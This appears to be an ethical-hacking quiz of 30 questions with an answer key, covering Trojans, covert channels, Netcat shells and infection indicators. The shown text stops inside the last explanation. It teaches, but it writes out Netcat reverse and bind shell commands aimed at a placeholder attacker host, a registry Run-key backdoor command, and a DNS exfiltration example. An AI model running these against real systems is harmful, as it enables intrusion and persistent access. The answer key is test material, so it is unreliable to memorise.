# 🐴 MCQ Set — Session 12B

Module: Security Concepts — Ethical Hacking
Coverage: Trojans & Backdoors · Overt/Covert Channels · Types of Trojans · Reverse-Connecting Trojans · Netcat · Trojan Indicators
Total Questions: 30
Format: Foundation + Fundamental + Basic Concepts only

---

## 📋 Table of Contents

1. [Questions — Q1 to Q30](#questions)
2. [Answers & Explanations](#answers--explanations)
3. [Quick Answer Key](#quick-answer-key)
4. [Topic Coverage Map](#topic-coverage-map)

---

## Questions

Q1. What is the defining characteristic that separates a Trojan from a virus?

A) A Trojan encrypts files while a virus does not
B) A Trojan does not self-replicate while a virus does
C) A Trojan spreads over the network while a virus requires a USB
D) A Trojan targets only Windows systems while a virus targets all platforms

---

Q2. Which of the following correctly describes a bind shell?

A) The attacker listens on a port and the victim connects outbound to the attacker
B) The victim listens on a port and the attacker connects inbound to the victim
C) Both attacker and victim listen simultaneously and negotiate a connection
D) The shell is bound to a specific user account on the victim machine

---

Q3. Why do reverse shells successfully bypass most corporate firewalls?

A) Reverse shells encrypt their traffic using AES-256 making them invisible to firewalls
B) Reverse shells use port 80 exclusively which firewalls cannot inspect
C) Reverse shells initiate outbound connections from the victim which most firewalls permit by default
D) Reverse shells tunnel through the DNS protocol which firewalls never block

---

Q4. What is the primary purpose of a downloader Trojan?

A) To record all keystrokes typed on the victim machine
B) To establish an initial foothold and then download and execute the real payload
C) To intercept online banking transactions in real time
D) To enrol the victim machine into a botnet for DDoS attacks

---

Q5. Which Netcat command correctly sets up a reverse shell on a Windows victim machine?

A) nc -lvnp 4444 -e cmd.exe
B) nc [attacker_ip] 4444 -e cmd.exe
C) nc -lvnp 4444 -e /bin/bash
D) nc [victim_ip] 4444 -e cmd.exe

---

Q6. What is an overt channel in the context of network communications?

A) A hidden communication pathway that violates the system security policy
B) A channel that uses encryption to hide the content of transmitted data
C) A legitimate, intended, and authorised communication pathway within a system
D) A channel created by malware to exfiltrate data without detection

---

Q7. Which of the following is the correct MITRE ATT&CK tactic ID for Persistence?

A) TA0001
B) TA0006
C) TA0003
D) TA0011

---

Q8. The SolarWinds SUNBURST attack in 2020 is a benchmark example of which Trojan delivery technique?

A) Phishing email with malicious attachment
B) Drive-by download from a compromised website
C) USB drop attack targeting employees
D) Supply chain attack via a trojanised software update

---

Q9. What does the -e flag do in a Netcat command?

A) Enables encryption on the Netcat connection
B) Specifies the external IP address of the attacker
C) Executes a program and connects its input and output to the socket
D) Sets the number of connection retries before timeout

---

Q10. Which type of Trojan sits inside the browser and manipulates financial transactions in real time before they are submitted to the bank?

A) Proxy Trojan
B) Downloader Trojan
C) Man-in-the-Browser (MitB) Banking Trojan
D) Infostealer Trojan

---

Q11. What is a covert channel?

A) A communication channel that uses strong encryption to protect data in transit
B) An unintended hidden communication pathway that transfers information in a way that violates security policy
C) A legitimate VPN tunnel used to bypass geographic restrictions
D) A firewall rule allowing specific outbound connections on non-standard ports

---

Q12. Which Netcat command correctly creates a bind shell on a Linux victim machine?

A) nc [attacker_ip] 4444 -e /bin/bash
B) nc -lvnp 4444 -e cmd.exe
C) nc -lvnp 4444 -e /bin/bash
D) nc [attacker_ip] 4444 -e cmd.exe

---

Q13. What persistence mechanism does the following Windows command implement?
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v backdoor /d "nc -lvnp 4444 -e cmd.exe" /f

A) Scheduled Task — runs Netcat at a specified time
B) Registry Run Key — starts Netcat automatically at every Windows startup
C) Windows Service — registers Netcat as a system service
D) WMI subscription — triggers Netcat on a system event

---

Q14. Which of the following is an example of a storage covert channel?

A) Encoding data by varying the time interval between network packets
B) Encoding C2 commands as DNS subdomain names in DNS queries
C) Using a VPN to encrypt and tunnel Trojan traffic
D) Beaconing at regular 30-second intervals to a C2 server

---

Q15. What is the primary reason reverse shells are preferred over bind shells by attackers?

A) Reverse shells are faster and consume less bandwidth
B) Reverse shells do not require the Netcat tool to be present on the victim
C) Reverse shells initiate outbound connections from the victim which typically pass through firewalls uninspected
D) Reverse shells automatically encrypt all communications without configuration

---

Q16. Which tool is described as the Swiss Army knife of networking and is commonly abused to create backdoor shells?

A) Wireshark
B) Nmap
C) Netcat
D) Burp Suite

---

Q17. NotPetya (2017) is classified as which type of Trojan?

A) Banking Trojan — it targeted financial transaction systems
B) Botnet Trojan — it enrolled machines in a DDoS botnet
C) Destructive Trojan / Wiper — it destroyed data and was disguised as ransomware
D) RAT — it provided full remote access to attackers

---

Q18. Which of the following correctly describes the difference between a RAT and a simple backdoor?

A) A RAT only works on Linux systems while a backdoor works on all platforms
B) A RAT provides full remote control including screen, files, camera and keylogging while a backdoor provides only a command shell
C) A backdoor encrypts its communications while a RAT does not
D) A RAT requires physical access to install while a backdoor is installed remotely

---

Q19. What is beaconing in the context of Trojan C2 communication?

A) The process of scanning a network to discover active hosts
B) A regular periodic outbound connection from an infected host to a C2 server to receive commands
C) The technique of hiding C2 data inside DNS queries
D) The process of a Trojan downloading additional payloads from the internet

---

Q20. Which of the following is a host-based indicator of a Trojan infection?

A) Periodic outbound connections at regular 30-second intervals to an unknown IP
B) Large volume of DNS queries to randomly named domains
C) Unexpected entries in the Windows Registry Run key pointing to unknown executables
D) HTTPS traffic to an IP address with a self-signed certificate

---

Q21. Which MITRE ATT&CK tactic ID covers Command and Control communication?

A) TA0003
B) TA0010
C) TA0011
D) TA0009

---

Q22. What is HTTP tunnelling used for in the context of Trojans and backdoors?

A) Encrypting Trojan traffic using the HTTPS certificate infrastructure
B) Encapsulating C2 commands inside HTTP or HTTPS requests to bypass firewall rules that permit web traffic
C) Scanning web applications for vulnerabilities before deploying a Trojan
D) Transferring stolen files using the FTP protocol disguised as HTTP

---

Q23. Which of the following Trojans is correctly matched to its category?

A) NotPetya — Banking Trojan
B) RedLine Stealer — RAT
C) Zeus — Banking Trojan
D) Mirai — Downloader Trojan

---

Q24. What is a DGA (Domain Generation Algorithm) and why do Trojans use it?

A) An algorithm that generates strong encryption keys for securing C2 communications
B) An algorithm producing many pseudo-random domain names so the C2 infrastructure is resilient against takedown
C) A DNS security extension that prevents DNS spoofing against C2 domains
D) An algorithm generating random port numbers to evade firewall port-blocking rules

---

Q25. Which of the following correctly identifies the Netcat flag combination for listen mode?

A) -e -v -p
B) -l -v -n -p
C) -c -s -p
D) -r -v -n -p

---

Q26. What is the key difference between a covert channel and an encrypted channel?

A) A covert channel hides the existence of communication while an encrypted channel hides the content of communication
B) A covert channel uses military-grade encryption while an encrypted channel uses commercial encryption
C) A covert channel only works over UDP while an encrypted channel requires TCP
D) There is no difference — covert channels always use encryption

---

Q27. Operation Duck Hunt in August 2023 resulted in the disruption of which Trojan/botnet?

A) Emotet
B) TrickBot
C) QakBot
D) Mirai

---

Q28. Under the Indian IT Act 2000, installing a Trojan on critical infrastructure such as a power grid with intent to threaten national security falls under which section and carries what penalty?

A) Section 66 — 3 years imprisonment + ₹5 lakh fine
B) Section 66B — 3 years imprisonment + ₹1 lakh fine
C) Section 43(b) — civil compensation up to ₹1 crore
D) Section 66F — life imprisonment

---

Q29. Which Meterpreter transport option provides the strongest firewall bypass capability while also encrypting C2 traffic?

A) reverse_tcp on port 4444
B) reverse_http on port 80
C) reverse_https on port 443
D) reverse_dns on port 53

---

Q30. What is the most reliable remediation action when a system is confirmed to be infected with a Trojan that has installed multiple persistence mechanisms?

A) Run a full antivirus scan and delete all detected files
B) Disable all startup entries using Autoruns and restart the system
C) Re-image the affected system — this is the only reliable way to remove all persistence mechanisms
D) Change all user passwords and enable MFA on the compromised account

---




---




---

## Answers & Explanations

---

Q1. Correct Answer: B) A Trojan does not self-replicate while a virus does ✅

Explanation: The single most tested malware classification distinction. A Trojan disguises itself as legitimate software but does NOT self-replicate. A virus DOES self-replicate by attaching itself to host files. A worm also self-replicates but without needing a host file. This three-way distinction is fundamental.

A) A Trojan encrypts files while a virus does not — ❌ File encryption is a ransomware characteristic — not the defining trait of a Trojan.
B) A Trojan does not self-replicate while a virus does — ✅ Correct. This is the primary classification distinction.
C) A Trojan spreads over the network while a virus requires a USB — ❌ This reverses the typical spread mechanisms and is factually incorrect for both.
D) A Trojan targets only Windows systems while a virus targets all platforms — ❌ Both target multiple platforms — platform scope is not the defining difference.

---

Q2. Correct Answer: B) The victim listens on a port and the attacker connects inbound to the victim ✅

Explanation: In a bind shell — the VICTIM machine runs nc -lvnp [port] -e cmd.exe — it listens (binds to a port). The ATTACKER then connects INBOUND to that port on the victim. This is the opposite of a reverse shell where the victim connects out. Bind shells are generally blocked by firewalls protecting the victim's inbound connections.

A) The attacker listens on a port and the victim connects outbound to the attacker — ❌ This describes a REVERSE shell, not a bind shell.
B) The victim listens on a port and the attacker connects inbound to the victim — ✅ Correct. Victim listens = bind shell.
C) Both attacker and victim listen simultaneously and negotiate a connection — ❌ Only one side listens — this is not how TCP connections work.
D) The shell is bound to a specific user account on the victim machine — ❌ The word "bound" here refers to binding to a network port — not a user account.

---

Q3. Correct Answer: C) Reverse shells initiate outbound connections from the victim which most firewalls permit by default ✅

Explanation: Traditional stateful firewalls block unsolicited INBOUND connections but allow OUTBOUND connections so users can browse the internet, send emails, and access cloud services. A reverse shell exploits this — the victim Trojan connects OUT to the attacker's listener. The firewall sees a normal outbound connection and permits it. This is the fundamental reason reverse shells are the preferred technique.

A) Reverse shells encrypt their traffic using AES-256 making them invisible to firewalls — ❌ Encryption is a separate concern — basic Netcat reverse shells are plaintext. The bypass works due to connection direction not encryption.
B) Reverse shells use port 80 exclusively which firewalls cannot inspect — ❌ Reverse shells can use any port — port 80 is one option. The bypass is about direction not port.
C) Reverse shells initiate outbound connections from the victim which most firewalls permit by default — ✅ Correct.
D) Reverse shells tunnel through the DNS protocol which firewalls never block — ❌ DNS tunnelling is a specific technique — not inherent to all reverse shells. Firewalls can and do inspect DNS.

---

Q4. Correct Answer: B) To establish an initial foothold and then download and execute the real payload ✅

Explanation: A downloader Trojan (also called a stager or loader) is a small, lightweight first-stage payload. Its only job is to establish a connection to the C2 server and pull down the real malware — RAT, ransomware, banking Trojan. Small size means it evades detection more easily. Examples: Emotet historically, BumbleBee (2022–2024), TrickBot (initial stage).

A) To record all keystrokes typed on the victim machine — ❌ That is a keylogger function — not a downloader Trojan.
B) To establish an initial foothold and then download and execute the real payload — ✅ Correct.
C) To intercept online banking transactions in real time — ❌ That is a banking Trojan function (MitB, form grabbing).
D) To enrol the victim machine into a botnet for DDoS attacks — ❌ That is a botnet Trojan function.

---

Q5. Correct Answer: B) nc [attacker_ip] 4444 -e cmd.exe ✅

Explanation: A reverse shell on the victim means the VICTIM connects OUT to the attacker. The victim runs: nc [attacker_ip] [port] -e cmd.exe — connecting to the attacker's IP and attaching cmd.exe to the socket. The attacker runs nc -lvnp 4444 on their machine to listen. Option A is the bind shell command (victim listening). Option C is a Linux bind shell. Option D would be the attacker connecting to the victim — that is a bind shell connection.

A) nc -lvnp 4444 -e cmd.exe — ❌ This is the victim-side BIND shell command — victim listens, attacker connects in.
B) nc [attacker_ip] 4444 -e cmd.exe — ✅ Correct. Victim connects OUT to attacker — reverse shell.
C) nc -lvnp 4444 -e /bin/bash — ❌ This is a Linux bind shell command — not a Windows reverse shell.
D) nc [victim_ip] 4444 -e cmd.exe — ❌ This would be the ATTACKER connecting to the victim — used in the bind shell scenario from the attacker side.

---

Q6. Correct Answer: C) A legitimate, intended, and authorised communication pathway within a system ✅

Explanation: An overt channel is the normal, expected, policy-permitted communication path — HTTPS web browsing, email via SMTP, DNS queries for name resolution. These channels are visible, expected, and allowed. Attackers abuse overt channels by hiding covert communication INSIDE them — the channel is legitimate but the hidden data inside it is not.

A) A hidden communication pathway that violates the system security policy — ❌ This describes a COVERT channel, not an overt channel.
B) A channel that uses encryption to hide the content of transmitted data — ❌ Encryption is a separate concept — it hides content, not the channel's legitimacy status.
C) A legitimate, intended, and authorised communication pathway within a system — ✅ Correct.
D) A channel created by malware to exfiltrate data without detection — ❌ This describes the malicious USE of a covert channel — not the definition of an overt channel.

---

Q7. Correct Answer: C) TA0003 ✅

Explanation: MITRE ATT&CK tactic IDs to memorise: TA0001 = Initial Access, TA0002 = Execution, TA0003 = Persistence, TA0004 = Privilege Escalation, TA0006 = Credential Access, TA0009 = Collection, TA0010 = Exfiltration, TA0011 = Command and Control. Trojans and backdoors primarily operate under TA0003 (Persistence) and TA0011 (C2).

A) TA0001 — ❌ TA0001 is Initial Access — how the attacker first gets in.
B) TA0006 — ❌ TA0006 is Credential Access — password cracking, hash capture.
C) TA0003 — ✅ Correct. Persistence.
D) TA0011 — ❌ TA0011 is Command and Control — C2 communication.

---

Q8. Correct Answer: D) Supply chain attack via a trojanised software update ✅

Explanation: SUNBURST was injected into the SolarWinds Orion software build pipeline — so the malicious backdoor was distributed as a legitimate, digitally signed software update. 18,000+ organisations downloaded it believing it was a normal update from a trusted vendor. Attributed to APT29 (Cozy Bear / Russia SVR). MITRE: T1195.002 — Compromise Software Supply Chain.

A) Phishing email with malicious attachment — ❌ No phishing was involved — the malware arrived as a trusted software update.
B) Drive-by download from a compromised website — ❌ No website compromise was involved in the delivery mechanism.
C) USB drop attack targeting employees — ❌ No physical media was used.
D) Supply chain attack via a trojanised software update — ✅ Correct.

---

Q9. Correct Answer: C) Executes a program and connects its input and output to the socket ✅

Explanation: The -e flag in Netcat specifies a program to execute after a connection is established, and pipes that program's stdin/stdout to the network socket. So -e cmd.exe means: when someone connects, give them cmd.exe — their input becomes commands, their screen receives output. This is how Netcat creates a shell over a network connection.

A) Enables encryption on the Netcat connection — ❌ Standard Netcat has no encryption. Ncat (with --ssl) and cryptcat provide encryption — not the -e flag.
B) Specifies the external IP address of the attacker — ❌ The IP address is specified as a positional argument in the command, not via -e.
C) Executes a program and connects its input and output to the socket — ✅ Correct.
D) Sets the number of connection retries before timeout — ❌ This is not a function of the -e flag in Netcat.

---

Q10. Correct Answer: C) Man-in-the-Browser (MitB) Banking Trojan ✅

Explanation: A Man-in-the-Browser attack occurs when malware hooks into the browser process and intercepts/manipulates data between the user and the bank's website — after the page is rendered but before the transaction is submitted. It can change destination account numbers, amounts, or intercept OTPs in real time. Zeus is the classic example.

A) Proxy Trojan — ❌ A proxy Trojan routes attacker traffic through the victim — it does not manipulate banking transactions.
B) Downloader Trojan — ❌ A downloader pulls additional payloads — it does not conduct financial fraud directly.
C) Man-in-the-Browser (MitB) Banking Trojan — ✅ Correct. Sits in browser, manipulates transactions in real time.
D) Infostealer Trojan — ❌ An infostealer harvests credentials passively — it does not manipulate active transactions.

---

Q11. Correct Answer: B) An unintended hidden communication pathway that transfers information in a way that violates security policy ✅

Explanation: A covert channel is defined by two properties: it is UNINTENDED (not designed into the system) and it VIOLATES SECURITY POLICY (transfers information that should not be transferred via that path). It hides the EXISTENCE of communication — not just the content. Examples: encoding data in DNS subdomains, IP TTL fields, packet timing.

A) A communication channel that uses strong encryption to protect data in transit — ❌ This describes an encrypted channel — encryption hides content, not the existence of communication.
B) An unintended hidden communication pathway that transfers information in a way that violates security policy — ✅ Correct.
C) A legitimate VPN tunnel used to bypass geographic restrictions — ❌ A VPN is an overt, authorised channel — not a covert channel.
D) A firewall rule allowing specific outbound connections on non-standard ports — ❌ This is a firewall policy — not a covert channel.

---

Q12. Correct Answer: C) nc -lvnp 4444 -e /bin/bash ✅

Explanation: A bind shell on a Linux victim: the victim listens (-lvnp 4444) and attaches /bin/bash to the connection (-e /bin/bash). When the attacker connects to victim:4444, they receive a bash shell. The -e /bin/bash is the Linux equivalent of -e cmd.exe for Windows. The attacker connects with: nc [victim_ip] 4444.

A) nc [attacker_ip] 4444 -e /bin/bash — ❌ This is the Linux REVERSE shell command — victim connects out to attacker.
B) nc -lvnp 4444 -e cmd.exe — ❌ This is a Windows bind shell command — cmd.exe does not exist on Linux.
C) nc -lvnp 4444 -e /bin/bash — ✅ Correct. Linux bind shell — victim listens, attaches bash.
D) nc [attacker_ip] 4444 -e cmd.exe — ❌ This is a Windows reverse shell command — wrong OS and wrong direction.

---

Q13. Correct Answer: B) Registry Run Key — starts Netcat automatically at every Windows startup ✅

Explanation: The reg add command writes a value to HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run — the Windows Registry Run key. Any executable listed here starts automatically when Windows boots. This ensures the Netcat listener restarts after every reboot, maintaining persistent backdoor access. MITRE: T1547.001.

A) Scheduled Task — runs Netcat at a specified time — ❌ Scheduled tasks use schtasks /create — not reg add.
B) Registry Run Key — starts Netcat automatically at every Windows startup — ✅ Correct.
C) Windows Service — registers Netcat as a system service — ❌ Services are created with sc create — not reg add to the Run key.
D) WMI subscription — triggers Netcat on a system event — ❌ WMI subscriptions use wmic or PowerShell WMI cmdlets — not reg add.

---

Q14. Correct Answer: B) Encoding C2 commands as DNS subdomain names in DNS queries ✅

Explanation: A storage covert channel hides data in stored or transmitted fields — content that exists in the protocol but is not normally inspected for hidden data. DNS subdomain encoding is the most common example: a C2 command like "exfil" is encoded as a subdomain — exfil.a7f3.attacker.com — sent as a normal DNS query. The attacker's DNS server decodes the subdomain.

A) Encoding data by varying the time interval between network packets — ❌ This is a TIMING covert channel — not a storage covert channel.
B) Encoding C2 commands as DNS subdomain names in DNS queries — ✅ Correct. Classic storage covert channel.
C) Using a VPN to encrypt and tunnel Trojan traffic — ❌ VPN is an overt, authorised encrypted channel — not a covert channel.
D) Beaconing at regular 30-second intervals to a C2 server — ❌ Beaconing is C2 communication — not a covert channel technique specifically.

---

Q15. Correct Answer: C) Reverse shells initiate outbound connections from the victim which typically pass through firewalls uninspected ✅

Explanation: This is the core architectural reason. Firewalls block inbound connections (bind shell requires inbound). Firewalls allow outbound connections (reverse shell uses outbound). The attacker gets a shell either way — but only the reverse shell reliably bypasses perimeter firewall controls. This makes it the universally preferred approach for post-exploitation access.

A) Reverse shells are faster and consume less bandwidth — ❌ Speed and bandwidth are not relevant factors in this preference — firewall bypass is.
B) Reverse shells do not require the Netcat tool to be present on the victim — ❌ Reverse shells still require a tool (Netcat, Meterpreter, etc.) on the victim.
C) Reverse shells initiate outbound connections from the victim which typically pass through firewalls uninspected — ✅ Correct.
D) Reverse shells automatically encrypt all communications without configuration — ❌ Basic Netcat reverse shells are plaintext. Encryption requires additional configuration (ncat --ssl, Meterpreter reverse_https).

---

Q16. Correct Answer: C) Netcat ✅

Explanation: Netcat (nc) is universally called the Swiss Army knife of networking. It is a legitimate network utility used for port scanning, banner grabbing, file transfer, and network debugging. Attackers abuse it to create bind shells and reverse shells with a single command. It is dual-use — detecting it is not automatically an IOC — context determines malicious intent.

A) Wireshark — ❌ Wireshark is a network packet analyser — not described as the Swiss Army knife and not used to create shells.
B) Nmap — ❌ Nmap is a network scanner — powerful but not described by this phrase and not used for shell creation.
C) Netcat — ✅ Correct. Swiss Army knife of networking.
D) Burp Suite — ❌ Burp Suite is a web application security testing tool — not related to shell creation.

---

Q17. Correct Answer: C) Destructive Trojan / Wiper — it destroyed data and was disguised as ransomware ✅

Explanation: NotPetya (2017) is one of the most important malware case studies. It was DISGUISED as ransomware (displayed a ransom note) but its actual function was to destroy data — it overwrote the MBR and encrypted files with no actual decryption capability. Attributed to Sandworm (Russia GRU). Caused over $10 billion in damage. The disguise-as-ransomware design is what makes it a Trojan (disguised as something else) AND a wiper.

A) Banking Trojan — it targeted financial transaction systems — ❌ NotPetya targeted Ukrainian infrastructure and spread globally — it did not target banking transactions.
B) Botnet Trojan — it enrolled machines in a DDoS botnet — ❌ NotPetya destroyed systems — it did not build a botnet.
C) Destructive Trojan / Wiper — it destroyed data and was disguised as ransomware — ✅ Correct.
D) RAT — it provided full remote access to attackers — ❌ NotPetya provided no interactive remote access — it was purely destructive.

---

Q18. Correct Answer: B) A RAT provides full remote control including screen, files, camera and keylogging while a backdoor provides only a command shell ✅

Explanation: A RAT (Remote Access Trojan) is the most fully-featured Trojan category — it gives the attacker capabilities equivalent to sitting at the victim's keyboard: remote desktop, file management, keylogging, webcam, microphone, process management. A backdoor is simpler — it provides a command shell (cmd.exe or bash) for command execution only. A RAT includes a backdoor but a backdoor is not a RAT.

A) A RAT only works on Linux systems while a backdoor works on all platforms — ❌ RATs exist for all platforms — platform restriction is not the defining difference.
B) A RAT provides full remote control including screen, files, camera and keylogging while a backdoor provides only a command shell — ✅ Correct.
C) A backdoor encrypts its communications while a RAT does not — ❌ Encryption is not the defining difference between these categories.
D) A RAT requires physical access to install while a backdoor is installed remotely — ❌ Both are typically installed remotely via malware delivery — physical access is not required for either.

---

Q19. Correct Answer: B) A regular periodic outbound connection from an infected host to a C2 server to receive commands ✅

Explanation: Beaconing is the regular check-in behaviour of a Trojan — it connects to its C2 server at defined intervals (e.g., every 30 seconds) to receive commands and send back data. The regularity of these intervals creates a detectable pattern in network logs — SIEM rules look for connections to the same external IP at suspiciously regular intervals. Advanced Trojans use jitter (random variation) to evade interval-based detection.

A) The process of scanning a network to discover active hosts — ❌ That is network discovery/host scanning — a reconnaissance technique.
B) A regular periodic outbound connection from an infected host to a C2 server to receive commands — ✅ Correct.
C) The technique of hiding C2 data inside DNS queries — ❌ That is DNS tunnelling — a covert channel technique, not beaconing specifically.
D) The process of a Trojan downloading additional payloads from the internet — ❌ That is the function of a downloader Trojan — not beaconing.

---

Q20. Correct Answer: C) Unexpected entries in the Windows Registry Run key pointing to unknown executables ✅

Explanation: Registry Run key entries are host-based artefacts — they exist on the local system, visible via registry editor or Sysinternals Autoruns. An unexpected entry pointing to an unknown executable (especially in %TEMP%, %APPDATA%, or with a random name) is a classic persistence IOC. The other options (A, B, D) are all NETWORK-based indicators — visible in network traffic, not on the host file system or registry.

A) Periodic outbound connections at regular 30-second intervals to an unknown IP — ❌ This is a NETWORK-based indicator (beaconing) — detectable via network monitoring, not host inspection.
B) Large volume of DNS queries to randomly named domains — ❌ This is a NETWORK-based indicator (DGA) — visible in DNS logs, not on the host directly.
C) Unexpected entries in the Windows Registry Run key pointing to unknown executables — ✅ Correct. HOST-based indicator.
D) HTTPS traffic to an IP address with a self-signed certificate — ❌ This is a NETWORK-based indicator — visible via SSL inspection or proxy logs.

---

Q21. Correct Answer: C) TA0011 ✅

Explanation: MITRE ATT&CK TA0011 = Command and Control — the tactic covering how attackers communicate with compromised systems. All Trojan C2 techniques — beaconing, HTTP tunnelling, DNS tunnelling, covert channels — fall under TA0011. Key IDs: TA0003 = Persistence, TA0009 = Collection, TA0010 = Exfiltration, TA0011 = Command and Control.

A) TA0003 — ❌ TA0003 is Persistence — Registry Run keys, scheduled tasks, services.
B) TA0010 — ❌ TA0010 is Exfiltration — sending stolen data out of the network.
C) TA0011 — ✅ Correct. Command and Control.
D) TA0009 — ❌ TA0009 is Collection — gathering data of interest from the victim.

---

Q22. Correct Answer: B) Encapsulating C2 commands inside HTTP or HTTPS requests to bypass firewall rules that permit web traffic ✅

Explanation: HTTP tunnelling wraps non-HTTP data (C2 commands, reverse shell traffic, exfiltrated data) inside legitimate HTTP/HTTPS request and response bodies. Since port 80 (HTTP) and 443 (HTTPS) are virtually universally permitted outbound through firewalls, this technique guarantees C2 traffic passes through perimeter controls. Meterpreter's reverse_http and reverse_https transports use this approach.

A) Encrypting Trojan traffic using the HTTPS certificate infrastructure — ❌ Encryption is a side benefit of using HTTPS — the primary purpose of HTTP tunnelling is firewall bypass via protocol wrapping.
B) Encapsulating C2 commands inside HTTP or HTTPS requests to bypass firewall rules that permit web traffic — ✅ Correct.
C) Scanning web applications for vulnerabilities before deploying a Trojan — ❌ Web application scanning is a reconnaissance technique — unrelated to HTTP tunnelling.
D) Transferring stolen files using the FTP protocol disguised as HTTP — ❌ HTTP tunnelling wraps data in HTTP — it does not disguise FTP as HTTP at the protocol level.

---

Q23. Correct Answer: C) Zeus — Banking Trojan ✅

Explanation: Zeus (Zbot, 2007) is the foundational banking Trojan — the blueprint for all subsequent banking malware. It introduced form grabbing and web injection techniques. NotPetya is a destructive wiper. RedLine Stealer is an infostealer — not a RAT (it does not provide remote control). Mirai is a botnet Trojan targeting IoT devices for DDoS — not a downloader.

A) NotPetya — Banking Trojan — ❌ NotPetya is a destructive wiper disguised as ransomware.
B) RedLine Stealer — RAT — ❌ RedLine Stealer is an infostealer — it harvests credentials and data but does not provide remote control.
C) Zeus — Banking Trojan — ✅ Correct. The original banking Trojan (2007).
D) Mirai — Downloader Trojan — ❌ Mirai is a botnet Trojan — it enrolled IoT devices into a botnet for DDoS attacks (Dyn 2016, 1.2 Tbps).

---

Q24. Correct Answer: B) An algorithm producing many pseudo-random domain names so the C2 infrastructure is resilient against takedown ✅

Explanation: A DGA generates a large number (hundreds or thousands) of domain names using a mathematical algorithm seeded by date or other values. The malware and the C2 operator run the same algorithm — so both know which domains are active on any given day. If defenders take down one C2 domain, the Trojan simply tries the next algorithmically generated domain. This makes DGA-based botnets extremely difficult to disrupt by domain blocking.

A) An algorithm that generates strong encryption keys for securing C2 communications — ❌ DGA generates domain names — not encryption keys.
B) An algorithm producing many pseudo-random domain names so the C2 infrastructure is resilient against takedown — ✅ Correct.
C) A DNS security extension that prevents DNS spoofing against C2 domains — ❌ DNSSEC prevents DNS spoofing — DGA is an offensive technique, not a security extension.
D) An algorithm generating random port numbers to evade firewall port-blocking rules — ❌ DGA is about domain names — not port numbers.

---

Q25. Correct Answer: B) -l -v -n -p ✅

Explanation: Netcat listen mode uses: -l (listen), -v (verbose — shows connection info), -n (no DNS resolution — faster, avoids DNS logging), -p (specify port number). Combined: nc -lvnp 4444. This is the standard listener setup used by attackers to receive reverse shell connections.

A) -e -v -p — ❌ -e is the execute flag — not a listen mode flag. This combination does not create a listener.
B) -l -v -n -p — ✅ Correct. Standard Netcat listen mode flags.
C) -c -s -p — ❌ -c is not a standard Netcat flag in this context. -s specifies source IP — not used for standard listening.
D) -r -v -n -p — ❌ -r is not a standard Netcat listen mode flag.

---

Q26. Correct Answer: A) A covert channel hides the existence of communication while an encrypted channel hides the content of communication ✅

Explanation: This is the critical conceptual distinction. Encryption protects the CONTENT — what is being said. A covert channel hides the FACT that communication is happening at all — by embedding data inside seemingly innocent traffic (DNS queries, packet timing, image files). A covert channel can be completely unencrypted — the hidden data may be plaintext encoded in DNS subdomains.

A) A covert channel hides the existence of communication while an encrypted channel hides the content of communication — ✅ Correct. Existence vs content — this is the key distinction.
B) A covert channel uses military-grade encryption while an encrypted channel uses commercial encryption — ❌ Encryption grade has nothing to do with this distinction.
C) A covert channel only works over UDP while an encrypted channel requires TCP — ❌ Covert channels work over both TCP and UDP — protocol is not the defining difference.
D) There is no difference — covert channels always use encryption — ❌ Covert channels do NOT require encryption — timing channels and DNS subdomain channels carry no encryption whatsoever.

---

Q27. Correct Answer: C) QakBot ✅

Explanation: Operation Duck Hunt was the FBI-led operation in August 2023 that disrupted the QakBot (QBot) botnet and banking Trojan. QakBot had operated since 2008 and was one of the most long-running cybercriminal tools — used for credential theft, lateral movement, and ransomware delivery. The FBI seized the infrastructure and delivered an uninstaller to victim machines. Emotet was disrupted in January 2021. Mirai was never fully disrupted.

A) Emotet — ❌ Emotet was disrupted in January 2021 in a joint Europol/Eurojust operation — not Operation Duck Hunt.
B) TrickBot — ❌ TrickBot infrastructure was disrupted in 2020 by Microsoft and partners — not Operation Duck Hunt.
C) QakBot — ✅ Correct. Operation Duck Hunt — August 2023.
D) Mirai — ❌ Mirai has never been fully disrupted — its source code was released publicly in 2016 and variants still operate.

---

Q28. Correct Answer: D) Section 66F — life imprisonment ✅

Explanation: IT Act 2000 Section 66F covers cyber terrorism — defined as using computers or networks to threaten national security, critical infrastructure, or to strike terror. Specifically targeting power grids, banking systems, or defence with a Trojan/cyberattack falls under 66F. Penalty: life imprisonment — the harshest penalty in the IT Act. Section 66 covers general unauthorised access (3 years + ₹5L) — 66F is specifically for critical infrastructure attacks.

A) Section 66 — 3 years imprisonment + ₹5 lakh fine — ❌ Section 66 is general unauthorised computer access — not specific to critical infrastructure or national security threats.
B) Section 66B — 3 years imprisonment + ₹1 lakh fine — ❌ Section 66B covers receiving stolen computer resources/data — not critical infrastructure attacks.
C) Section 43(b) — civil compensation up to ₹1 crore — ❌ Section 43 covers civil liability for unauthorised access and data theft — not criminal penalties for cyber terrorism.
D) Section 66F — life imprisonment — ✅ Correct. Cyber terrorism against critical infrastructure.

---

Q29. Correct Answer: C) reverse_https on port 443 ✅

Explanation: Meterpreter's reverse_https transport combines two advantages: (1) it uses port 443 — virtually universally allowed outbound through firewalls, (2) all traffic is TLS-encrypted — network inspection tools cannot read the C2 content. reverse_tcp on port 4444 is easily blocked. reverse_http on port 80 bypasses port-based rules but is unencrypted. reverse_dns provides good bypass but is slower and more detectable via DNS monitoring.

A) reverse_tcp on port 4444 — ❌ Port 4444 is non-standard and easily blocked by firewalls. No encryption.
B) reverse_http on port 80 — ❌ Port 80 bypasses port-based rules but traffic is plaintext — IDS/proxy can inspect it.
C) reverse_https on port 443 — ✅ Correct. Port 443 allowed + TLS encrypted = strongest combined bypass.
D) reverse_dns on port 53 — ❌ DNS tunnelling bypasses many firewalls but is slower, has bandwidth limitations, and generates detectable high-volume DNS traffic.

---

Q30. Correct Answer: C) Re-image the affected system — this is the only reliable way to remove all persistence mechanisms ✅

Explanation: When a Trojan has installed multiple persistence mechanisms — Registry Run keys, scheduled tasks, services, rootkit components, DLL hijacks — attempting to clean the system risks missing hidden or rootkit-protected persistence. The attacker may retain access even after apparent remediation. Re-imaging (wiping and reinstalling from a clean image) is the only guaranteed way to remove all malicious artefacts. This is the industry-standard incident response recommendation.

A) Run a full antivirus scan and delete all detected files — ❌ AV may miss rootkit-assisted components, in-memory malware, or novel variants. Not reliable for confirmed multi-persistence infections.
B) Disable all startup entries using Autoruns and restart the system — ❌ Autoruns is excellent for finding persistence but rootkits can hide entries from it. Not sufficient for a confirmed Trojan infection.
